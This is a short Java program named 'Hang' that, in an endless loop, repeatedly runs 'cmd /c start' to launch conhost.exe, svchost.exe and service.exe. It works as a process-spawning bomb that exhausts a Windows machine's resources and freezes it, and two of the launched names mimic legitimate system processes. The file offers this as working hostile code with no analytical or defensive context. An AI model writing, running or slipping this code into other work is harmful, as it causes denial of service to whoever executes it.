import java.io.*;
public class Hang 
{
    @Deprecated
    public static void main(String[] args) throws Exception
    {
        int i = 0;
        while(true)    
        {
            Runtime.getRuntime().exec(" cmd /c start conhost.exe");
            Runtime.getRuntime().exec(" cmd /c start svchost.exe");
            Runtime.getRuntime().exec(" cmd /c start service.exe");
        }
    }    
}
